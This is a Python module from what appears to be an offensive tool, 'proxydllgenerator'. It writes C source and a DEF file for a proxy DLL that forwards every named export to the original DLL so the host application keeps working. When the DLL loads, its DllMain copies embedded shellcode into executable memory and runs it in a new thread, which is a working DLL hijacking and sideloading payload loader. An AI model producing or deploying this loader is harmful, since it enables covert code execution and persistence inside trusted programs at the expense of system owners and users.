"""Generate the proxy DLL C source and DEF file."""

from __future__ import annotations

import os
from typing import Optional

from .dll_parser import DllInfo, ExportEntry

# ---------------------------------------------------------------------------
# C source template
# ---------------------------------------------------------------------------

_DLLMAIN_TEMPLATE = """\
/*
 * Proxy DLL – auto-generated by proxydllgenerator
 * Original DLL : {orig_dll_name}.dll
 * Shellcode    : {shellcode_path}
 * Arch         : {arch}
 */
#include <windows.h>

static const unsigned char _shellcode[] = {{
{shellcode_bytes}
}};

static DWORD WINAPI _ShellcodeThread(LPVOID lpParam)
{{
    (void)lpParam;
    LPVOID mem = VirtualAlloc(NULL, sizeof(_shellcode),
                              MEM_COMMIT | MEM_RESERVE,
                              PAGE_EXECUTE_READWRITE);
    if (!mem)
        return 1;

    /* manual byte copy to avoid CRT memcpy dependency */
    for (SIZE_T i = 0; i < sizeof(_shellcode); i++)
        ((unsigned char *)mem)[i] = _shellcode[i];

    ((void (*)(void))mem)();

    /* shellcode is not expected to return; clean up if it does */
    VirtualFree(mem, 0, MEM_RELEASE);
    return 0;
}}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
{{
    (void)lpvReserved;
    switch (fdwReason) {{
        case DLL_PROCESS_ATTACH:
            DisableThreadLibraryCalls(hinstDLL);
            CloseHandle(CreateThread(NULL, 0, _ShellcodeThread, NULL, 0, NULL));
            break;
        case DLL_PROCESS_DETACH:
        case DLL_THREAD_ATTACH:
        case DLL_THREAD_DETACH:
            break;
    }}
    return TRUE;
}}
"""

# Bytes per line in the shellcode hex dump
_BYTES_PER_LINE = 12


def _format_shellcode(data: bytes) -> str:
    """Format raw bytes as a C hex initialiser list, 12 bytes per line."""
    lines: list[str] = []
    for i in range(0, len(data), _BYTES_PER_LINE):
        chunk = data[i : i + _BYTES_PER_LINE]
        lines.append("    " + ", ".join(f"0x{b:02x}" for b in chunk))
    return ",\n".join(lines)


def generate_dllmain(
    shellcode_path: str,
    orig_dll_name: str,
    arch: str,
) -> str:
    """Return the full C source for the proxy DllMain."""
    with open(shellcode_path, "rb") as fh:
        data = fh.read()

    if not data:
        raise ValueError(f"Shellcode file is empty: {shellcode_path}")

    return _DLLMAIN_TEMPLATE.format(
        orig_dll_name=orig_dll_name,
        shellcode_path=os.path.basename(shellcode_path),
        arch=arch,
        shellcode_bytes=_format_shellcode(data),
    )


# ---------------------------------------------------------------------------
# DEF file generator
# ---------------------------------------------------------------------------

def generate_def_file(
    proxy_name: str,
    orig_name: str,
    exports: list[ExportEntry],
) -> tuple[str, int]:
    """
    Build the EXPORTS section for the proxy DEF file.

    Returns:
        (def_text, skipped_count)
        skipped_count – number of ordinal-only exports that could not be forwarded.
    """
    lines: list[str] = [
        f"; Proxy DEF – auto-generated by proxydllgenerator",
        f"; All named exports forwarded to {orig_name}.dll",
        f"",
        f"LIBRARY {proxy_name}",
        f"EXPORTS",
    ]

    skipped = 0
    for exp in exports:
        if exp.name is None:
            # Ordinal-only export – cannot forward by name; skip
            skipped += 1
            lines.append(
                f"    ; @{exp.ordinal} NONAME – skipped (ordinal-only, no forwarding name)"
            )
            continue

        if exp.forwarder:
            # Export in the original DLL was itself a forwarder – re-forward to it
            lines.append(f"    {exp.name}={exp.forwarder} @{exp.ordinal}")
        else:
            lines.append(f"    {exp.name}={orig_name}.{exp.name} @{exp.ordinal}")

    return "\n".join(lines) + "\n", skipped


# ---------------------------------------------------------------------------
# Write both files to disk
# ---------------------------------------------------------------------------

def write_build_files(
    build_dir: str,
    proxy_name: str,
    orig_name: str,
    dll_info: DllInfo,
    shellcode_path: str,
    arch: str,
) -> tuple[str, str, int]:
    """
    Write dllmain.c and proxy.def into build_dir.

    Returns:
        (c_path, def_path, skipped_ordinals)
    """
    os.makedirs(build_dir, exist_ok=True)

    c_src = generate_dllmain(shellcode_path, orig_name, arch)
    def_src, skipped = generate_def_file(proxy_name, orig_name, dll_info.exports)

    c_path = os.path.join(build_dir, "dllmain.c")
    def_path = os.path.join(build_dir, "proxy.def")

    with open(c_path, "w", encoding="utf-8") as fh:
        fh.write(c_src)
    with open(def_path, "w", encoding="utf-8") as fh:
        fh.write(def_src)

    return c_path, def_path, skipped
